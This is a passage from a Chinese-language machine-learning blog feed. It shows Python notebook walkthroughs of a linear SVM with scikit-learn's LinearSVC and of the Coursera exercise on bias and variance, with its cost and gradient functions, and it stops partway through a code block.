        <content type="html"><![CDATA[<p>本文是对线性SVM实践性理解，利用sklearn.svm中的LinearSVC。此外参考链接给出了几个较为详细的SVM原理理解。</p><a id="more"></a><h2 id="数据集操作"><a href="#数据集操作" class="headerlink" title="数据集操作"></a>数据集操作</h2><ul><li>导入模块</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> sklearn.svm</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">import</span> scipy.io <span class="keyword">as</span> sio</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure><ul><li>加载数据集</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mat = sio.loadmat(<span class="string">'./data/ex6data1.mat'</span>)</span><br><span class="line">mat</span><br></pre></td></tr></table></figure><pre><code>{&apos;__header__&apos;: b&apos;MATLAB 5.0 MAT-file, Platform: GLNXA64, Created on: Sun Nov 13 14:28:43 2011&apos;, &apos;__version__&apos;: &apos;1.0&apos;, &apos;__globals__&apos;: [], &apos;X&apos;: array([[1.9643  , 4.5957  ],        [2.2753  , 3.8589  ],        [2.9781  , 4.5651  ],        [2.932   , 3.5519  ],        [3.5772  , 2.856   ],        [4.015   , 3.1937  ],        [3.3814  , 3.4291  ],        [3.9113  , 4.1761  ],        [2.7822  , 4.0431  ],        [2.5518  , 4.6162  ],        [3.3698  , 3.9101  ],        [3.1048  , 3.0709  ],        [1.9182  , 4.0534  ],        [2.2638  , 4.3706  ],        [2.6555  , 3.5008  ],        [3.1855  , 4.2888  ],        [3.6579  , 3.8692  ],        [3.9113  , 3.4291  ],        [3.6002  , 3.1221  ],        [3.0357  , 3.3165  ],        [1.5841  , 3.3575  ],        [2.0103  , 3.2039  ],        [1.9527  , 2.7843  ],        [2.2753  , 2.7127  ],        [2.3099  , 2.9584  ],        [2.8283  , 2.6309  ],        [3.0473  , 2.2931  ],        [2.4827  , 2.0373  ],        [2.5057  , 2.3853  ],        [1.8721  , 2.0577  ],        [2.0103  , 2.3546  ],        [1.2269  , 2.3239  ],        [1.8951  , 2.9174  ],        [1.561   , 3.0709  ],        [1.5495  , 2.6923  ],        [1.6878  , 2.4057  ],        [1.4919  , 2.0271  ],        [0.962   , 2.682   ],        [1.1693  , 2.9276  ],        [0.8122  , 2.9992  ],        [0.9735  , 3.3881  ],        [1.25    , 3.1937  ],        [1.3191  , 3.5109  ],        [2.2292  , 2.201   ],        [2.4482  , 2.6411  ],        [2.7938  , 1.9656  ],        [2.091   , 1.6177  ],        [2.5403  , 2.8867  ],        [0.9044  , 3.0198  ],        [0.76615 , 2.5899  ],        [0.086405, 4.1045  ]]), &apos;y&apos;: arraydtype=uint8)}</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mat = sio.loadmat(<span class="string">'./data/ex6data1.mat'</span>)</span><br><span class="line">print(mat.keys())</span><br><span class="line">data = pd.DataFrame(mat.get(<span class="string">'X'</span>), columns=[<span class="string">'X1'</span>, <span class="string">'X2'</span>])</span><br><span class="line">data[<span class="string">'y'</span>] = mat.get(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">data.head()</span><br></pre></td></tr></table></figure><pre><code>dict_keys([&apos;__header__&apos;, &apos;__version__&apos;, &apos;__globals__&apos;, &apos;X&apos;, &apos;y&apos;])</code></pre><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>X1</th>      <th>X2</th>      <th>y</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>1.9643</td>      <td>4.5957</td>      <td>1</td>    </tr>    <tr>      <td>1</td>      <td>2.2753</td>      <td>3.8589</td>      <td>1</td>    </tr>    <tr>      <td>2</td>      <td>2.9781</td>      <td>4.5651</td>      <td>1</td>    </tr>    <tr>      <td>3</td>      <td>2.9320</td>      <td>3.5519</td>      <td>1</td>    </tr>    <tr>      <td>4</td>      <td>3.5772</td>      <td>2.8560</td>      <td>1</td>    </tr>  </tbody></table></div><p>可视化data</p><p>注意左边的边界情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">8</span>,<span class="number">6</span>))</span><br><span class="line">ax.scatter(data[<span class="string">'X1'</span>], data[<span class="string">'X2'</span>], s=<span class="number">50</span>, c=data[<span class="string">'y'</span>], cmap=<span class="string">'Reds'</span>)</span><br><span class="line">ax.set_title(<span class="string">'Raw data'</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">'X1'</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">'X2'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20718svm01.png" alt="png"></p><h2 id="try-C-1"><a href="#try-C-1" class="headerlink" title="try $C=1$"></a>try $C=1$</h2><p><a href="http://scikit-learn.org/stable/modules/generated/sklearn.svm.LinearSVC.html#sklearn.svm.LinearSVC" target="_blank" rel="noopener">http://scikit-learn.org/stable/modules/generated/sklearn.svm.LinearSVC.html#sklearn.svm.LinearSVC</a></p><ul><li>fix(X,y): 训练模型</li><li>predict(X): 用模型进行预测，返回预测值</li><li>score(X,y[, sample_weight]):返回在(X, y)上预测的准确率</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">svc1 = sklearn.svm.LinearSVC(C=<span class="number">1</span>, loss=<span class="string">'hinge'</span>)</span><br><span class="line">svc1.fit(data[[<span class="string">'X1'</span>, <span class="string">'X2'</span>]], data[<span class="string">'y'</span>])</span><br><span class="line">svc1.score(data[[<span class="string">'X1'</span>, <span class="string">'X2'</span>]], data[<span class="string">'y'</span>])</span><br></pre></td></tr></table></figure><pre><code>0.9803921568627451</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="string">'SVM1 Confidence'</span>] = svc1.decision_function(data[[<span class="string">'X1'</span>, <span class="string">'X2'</span>]])</span><br><span class="line">data.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>X1</th>      <th>X2</th>      <th>y</th>      <th>SVM1 Confidence</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>1.9643</td>      <td>4.5957</td>      <td>1</td>      <td>0.798413</td>    </tr>    <tr>      <td>1</td>      <td>2.2753</td>      <td>3.8589</td>      <td>1</td>      <td>0.380796</td>    </tr>    <tr>      <td>2</td>      <td>2.9781</td>      <td>4.5651</td>      <td>1</td>      <td>1.372965</td>    </tr>    <tr>      <td>3</td>      <td>2.9320</td>      <td>3.5519</td>      <td>1</td>      <td>0.518512</td>    </tr>    <tr>      <td>4</td>      <td>3.5772</td>      <td>2.8560</td>      <td>1</td>      <td>0.331923</td>    </tr>  </tbody></table></div><ul><li>画出SVM1 confidence图像</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">8</span>,<span class="number">6</span>))</span><br><span class="line">ax.scatter(data[<span class="string">'X1'</span>], data[<span class="string">'X2'</span>], s=<span class="number">50</span>, c=data[<span class="string">'SVM1 Confidence'</span>], cmap=<span class="string">'RdBu'</span>)</span><br><span class="line">ax.set_title(<span class="string">'SVM (C=1) Decision Confidence'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20718svm02.png" alt="png"></p><h2 id="try-C-100"><a href="#try-C-100" class="headerlink" title="try $C=100$"></a>try $C=100$</h2><p>对于较大的C，你会尝试过度拟合数据，所以左边的边缘情况现在被归为右边</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">svc100 = sklearn.svm.LinearSVC(C=<span class="number">100</span>, loss=<span class="string">'hinge'</span>)</span><br><span class="line">svc100.fit(data[[<span class="string">'X1'</span>, <span class="string">'X2'</span>]], data[<span class="string">'y'</span>])</span><br><span class="line">svc100.score(data[[<span class="string">'X1'</span>, <span class="string">'X2'</span>]], data[<span class="string">'y'</span>])</span><br></pre></td></tr></table></figure><pre><code>0.9803921568627451</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="string">'SVM100 Confidence'</span>] = svc100.decision_function(data[[<span class="string">'X1'</span>, <span class="string">'X2'</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">8</span>,<span class="number">6</span>))</span><br><span class="line">ax.scatter(data[<span class="string">'X1'</span>], data[<span class="string">'X2'</span>], s=<span class="number">50</span>, c=data[<span class="string">'SVM100 Confidence'</span>], cmap=<span class="string">'RdBu'</span>)</span><br><span class="line">ax.set_title(<span class="string">'SVM (C=100) Decision Confidence'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20718svm03.png" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>X1</th>      <th>X2</th>      <th>y</th>      <th>SVM1 Confidence</th>      <th>SVM100 Confidence</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>1.9643</td>      <td>4.5957</td>      <td>1</td>      <td>0.798413</td>      <td>3.483024</td>    </tr>    <tr>      <td>1</td>      <td>2.2753</td>      <td>3.8589</td>      <td>1</td>      <td>0.380796</td>      <td>1.652665</td>    </tr>    <tr>      <td>2</td>      <td>2.9781</td>      <td>4.5651</td>      <td>1</td>      <td>1.372965</td>      <td>4.569583</td>    </tr>    <tr>      <td>3</td>      <td>2.9320</td>      <td>3.5519</td>      <td>1</td>      <td>0.518512</td>      <td>1.502287</td>    </tr>    <tr>      <td>4</td>      <td>3.5772</td>      <td>2.8560</td>      <td>1</td>      <td>0.331923</td>      <td>0.181774</td>    </tr>  </tbody></table></div><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><p><a href="https://www.jianshu.com/p/96e8fad1a2a4" target="_blank" rel="noopener">SVM理解参考链接</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/74484361" target="_blank" rel="noopener">SVM理解参考链接2：较为细致</a></p></li><li><p><a href="https://www.sohu.com/a/206572358_160850" target="_blank" rel="noopener">从超平面到SVM（一）</a></p></li><li><p><a href="https://www.sohu.com/a/211607605_160850" target="_blank" rel="noopener">从超平面到SVM（二）</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> SVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【吴恩达机器学习】练习5-方差与偏差</title>
      <link href="2020/07/07/ML-005%E5%81%8F%E5%B7%AE%E5%92%8C%E6%96%B9%E5%B7%AE-Exercise5/"/>
      <url>2020/07/07/ML-005%E5%81%8F%E5%B7%AE%E5%92%8C%E6%96%B9%E5%B7%AE-Exercise5/</url>
      
        <content type="html"><![CDATA[<p>对于这个练习，了解泛化误差中的方差和偏差</p><a id="more"></a><p>本章代码涵盖了基于Python的解决方案，用于Coursera机器学习课程的第五个编程练习。 请参考<a href="ex5.pdf">练习文本</a>了解详细的说明和公式。</p><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><ul><li>Numpy：为大型多维数组和矩阵添加 Python 支持，并提供高级的数学函数来运算这些数组。</li><li>SciPy：基于 Numpy，汇集了一系列的数学算法和便捷的函数。它可以向开发者提供用于数据操作与可视化的高级命令和类，是构建交互式 Python 会话的强大工具。</li><li>Pandas：面向数据操作和分析的 Python 库，提供用于处理数字图表和时序数据的数据结构和操作功能。</li><li>Matplotlib：Python 中常用的绘图库，能在跨平台的交互式环境生成高质量图形。后来在它的基础上又衍生了更为高级的绘图库 Seaborn。</li></ul><p>总的来说，如果你想理解和处理手头的数据，就用 Pandas；如果你想执行一些复杂的计算，就用 Numpy 和 SciPy；如果你想将数据可视化，就用 Matplotlib。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> scipy.io <span class="keyword">as</span> sio</span><br><span class="line"><span class="keyword">import</span> scipy.optimize <span class="keyword">as</span> opt</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br></pre></td></tr></table></figure><h2 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h2><ul><li>map简单示例<blockquote><ul><li>map() 会根据提供的函数对指定序列做映射。<br></li><li>第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表</li><li>map(function, iterable, …)Python 3.x 返回迭代器</li></ul></blockquote></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map(<span class="keyword">lambda</span> x, y: x + y, [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>], [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>])</span><br></pre></td></tr></table></figure><pre><code>&lt;map at 0x18734e11a08&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(map(<span class="keyword">lambda</span> x, y: x + y, [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>], [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>]))</span><br></pre></td></tr></table></figure><pre><code>[3, 7, 11, 15, 19]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(map(<span class="keyword">lambda</span> x: x ** <span class="number">2</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]))</span><br></pre></td></tr></table></figure><pre><code>[1, 4, 9, 16, 25]</code></pre><ul><li>加载数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = sio.loadmat(<span class="string">'ex5data1.mat'</span>)</span><br><span class="line">list(map(np.ravel, [d[<span class="string">'X'</span>], d[<span class="string">'y'</span>], d[<span class="string">'Xval'</span>], d[<span class="string">'yval'</span>], d[<span class="string">'Xtest'</span>], d[<span class="string">'ytest'</span>]]))</span><br></pre></td></tr></table></figure><pre><code>[array([-15.93675813, -29.15297922,  36.18954863,  37.49218733,        -48.05882945,  -8.94145794,  15.30779289, -34.70626581,          1.38915437, -44.38375985,   7.01350208,  22.76274892]), array([ 2.13431051,  1.17325668, 34.35910918, 36.83795516,  2.80896507,         2.12107248, 14.71026831,  2.61418439,  3.74017167,  3.73169131,         7.62765885, 22.7524283 ]), array([-16.74653578, -14.57747075,  34.51575866, -47.01007574,         36.97511905, -40.68611002,  -4.47201098,  26.53363489,        -42.7976831 ,  25.37409938, -31.10955398,  27.31176864,         -3.26386201,  -1.81827649, -40.7196624 , -50.01324365,        -17.41177155,   3.5881937 ,   7.08548026,  46.28236902,         14.61228909]), array([ 4.17020201e+00,  4.06726280e+00,  3.18730676e+01,  1.06236562e+01,         3.18360213e+01,  4.95936972e+00,  4.45159880e+00,  2.22763185e+01,        -4.38738274e-05,  2.05038016e+01,  3.85834476e+00,  1.93650529e+01,         4.88376281e+00,  1.10971588e+01,  7.46170827e+00,  1.47693464e+00,         2.71916388e+00,  1.09269007e+01,  8.34871235e+00,  5.27819280e+01,         1.33573396e+01]), array([-33.31800399, -37.91216403, -51.20693795,  -6.13259585,         21.26118327, -40.31952949, -14.54153167,  32.55976024,         13.39343255,  44.20988595,  -1.14267768, -12.76686065,         34.05450539,  39.22350028,   1.97449674,  29.6217551 ,        -23.66962971,  -9.01180139, -55.94057091, -35.70859752,          9.51020533]), array([ 3.31688953,  5.39768952,  0.13042984,  6.1925982 , 17.08848712,         0.79950805,  2.82479183, 28.62123334, 17.04639081, 55.38437334,         4.07936733,  8.27039793, 31.32355102, 39.15906103,  8.08727989,        24.11134389,  2.4773548 ,  6.56606472,  6.0380888 ,  4.69273956,        10.83004606])]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d[<span class="string">'X'</span>].shape</span><br></pre></td></tr></table></figure><pre><code>(12, 1)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d[<span class="string">'y'</span>]</span><br></pre></td></tr></table></figure><pre><code>array([[ 2.13431051],       [ 1.17325668],       [34.35910918],       [36.83795516],       [ 2.80896507],       [ 2.12107248],       [14.71026831],       [ 2.61418439],       [ 3.74017167],       [ 3.73169131],       [ 7.62765885],       [22.7524283 ]])</code></pre><h3 id="加载函数"><a href="#加载函数" class="headerlink" title="加载函数"></a>加载函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""for ex5</span></span><br><span class="line"><span class="string">    d['X'] shape = (12, 1)</span></span><br><span class="line"><span class="string">    pandas has trouble taking this 2d ndarray to construct a dataframe, so I ravel</span></span><br><span class="line"><span class="string">    the results</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    d = sio.loadmat(<span class="string">'ex5data1.mat'</span>)</span><br><span class="line">    <span class="keyword">return</span> map(np.ravel, [d[<span class="string">'X'</span>], d[<span class="string">'y'</span>], d[<span class="string">'Xval'</span>], d[<span class="string">'yval'</span>], d[<span class="string">'Xtest'</span>], d[<span class="string">'ytest'</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X, y, Xval, yval, Xtest, ytest = load_data()</span><br></pre></td></tr></table></figure><h3 id="构造df数据帧（DataFrame）"><a href="#构造df数据帧（DataFrame）" class="headerlink" title="构造df数据帧（DataFrame）"></a>构造df数据帧（DataFrame）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">'water_level'</span>:X, <span class="string">'flow'</span>:y&#125;)<span class="comment">#字典构造 ：数据帧(DataFrame)是二维数据结构，即数据以行和列的表格方式排列</span></span><br><span class="line">df</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>water_level</th>      <th>flow</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>-15.936758</td>      <td>2.134311</td>    </tr>    <tr>      <td>1</td>      <td>-29.152979</td>      <td>1.173257</td>    </tr>    <tr>      <td>2</td>      <td>36.189549</td>      <td>34.359109</td>    </tr>    <tr>      <td>3</td>      <td>37.492187</td>      <td>36.837955</td>    </tr>    <tr>      <td>4</td>      <td>-48.058829</td>      <td>2.808965</td>    </tr>    <tr>      <td>5</td>      <td>-8.941458</td>      <td>2.121072</td>    </tr>    <tr>      <td>6</td>      <td>15.307793</td>      <td>14.710268</td>    </tr>    <tr>      <td>7</td>      <td>-34.706266</td>      <td>2.614184</td>    </tr>    <tr>      <td>8</td>      <td>1.389154</td>      <td>3.740172</td>    </tr>    <tr>      <td>9</td>      <td>-44.383760</td>      <td>3.731691</td>    </tr>    <tr>      <td>10</td>      <td>7.013502</td>      <td>7.627659</td>    </tr>    <tr>      <td>11</td>      <td>22.762749</td>      <td>22.752428</td>    </tr>  </tbody></table></div><h3 id="seaborn-lmplot（回归图）"><a href="#seaborn-lmplot（回归图）" class="headerlink" title="seaborn.lmplot（回归图）"></a>seaborn.lmplot（回归图）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sns.lmplot(<span class="string">'water_level'</span>, <span class="string">'flow'</span>, data=df, fit_reg=<span class="literal">False</span>, size=<span class="number">5</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20711var_bias01.png" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sns.lmplot(<span class="string">'water_level'</span>, <span class="string">'flow'</span>, data=df, fit_reg=<span class="literal">True</span>, size=<span class="number">5</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20711var_bias02.png" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X, Xval, Xtest = [np.insert(x.reshape(x.shape[<span class="number">0</span>], <span class="number">1</span>), <span class="number">0</span>, np.ones(x.shape[<span class="number">0</span>]), axis=<span class="number">1</span>) <span class="keyword">for</span> x <span class="keyword">in</span> (X, Xval, Xtest)]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X</span><br></pre></td></tr></table></figure><pre><code>array([[  1.        , -15.93675813],       [  1.        , -29.15297922],       [  1.        ,  36.18954863],       [  1.        ,  37.49218733],       [  1.        , -48.05882945],       [  1.        ,  -8.94145794],       [  1.        ,  15.30779289],       [  1.        , -34.70626581],       [  1.        ,   1.38915437],       [  1.        , -44.38375985],       [  1.        ,   7.01350208],       [  1.        ,  22.76274892]])</code></pre><h2 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h2><p>$$J(\theta)= \frac{1}{2m}\sum_{i=1}^{m}(h_{\theta}(x^{(i)})-y^{(i)})^2$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(theta, X, y)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    X: R(m*n), m records, n features</span></span><br><span class="line"><span class="string">    y: R(m)</span></span><br><span class="line"><span class="string">    theta : R(n), linear regression parameters</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    inner = X @ theta - y  <span class="comment"># R(m*1)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1*m @ m*1 = 1*1 in matrix multiplication</span></span><br><span class="line">    <span class="comment"># but you know numpy didn't do transpose in 1d array, so here is just a</span></span><br><span class="line">    <span class="comment"># vector inner product to itselves</span></span><br><span class="line">    square_sum = inner.T @ inner</span><br><span class="line">    cost = square_sum / (<span class="number">2</span> * m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cost</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(theta, X, y)</span>:</span></span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    inner = X@ theta - y</span><br><span class="line">    </span><br><span class="line">    square_sum = inner.T@ inner</span><br><span class="line">    cost = square_sum / (<span class="number">2</span>*m)</span><br><span class="line">    <span class="keyword">return</span> cost</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">theta = np.ones(X.shape[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">cost(theta, X, y)</span><br></pre></td></tr></table></figure><pre><code>303.9515255535976</code></pre><ul><li>@符号可以表示矩阵的乘法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">2</span>,<span class="number">4</span>]])</span><br><span class="line">b = np.array([[<span class="number">2</span>,<span class="number">1</span>],[<span class="number">3</span>,<span class="number">3</span>]])</span><br><span class="line">a @ b</span><br></pre></td></tr></table></figure><pre><code>array([[11, 10],       [16, 14]])</code></pre><h2 id="梯度"><a href="#梯度" class="headerlink" title="梯度"></a>梯度</h2><p>$$ \theta_j := \theta_j - \alpha \frac{\partial J(\theta)}{\partial \theta_j}$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient</span><span class="params">(theta, X, y)</span>:</span></span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    inner = X.T @ (X @ theta - y)  <span class="comment"># (m,n).T @ (m, 1) -&gt; (n, 1)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> inner / m</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gradient(theta, X, y)</span><br></pre></td></tr></table></figure><pre><code>array([-15.30301567, 598.16741084])</code></pre><h2 id="正则化梯度"><a href="#正则化梯度" class="headerlink" title="正则化梯度"></a>正则化梯度</h2><p>$$\frac{\partial J(\theta)}{\partial \theta_0} = \frac{1}{m}\sum_{i=1}^{m}(h_{\theta}(x^{(i)})-y^{(i)})x_j^{(i)} <del>~ for ~</del>j =0$$<br>$$\frac{\partial J(\theta)}{\partial \theta_j} = (\frac{1}{m}\sum_{i=1}^{m}(h_{\theta}(x^{(i)})-y^{(i)})x_j^{(i)})+\frac{\lambda}{m}\theta_j <del>~ for ~</del>j \geq 1$$ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span 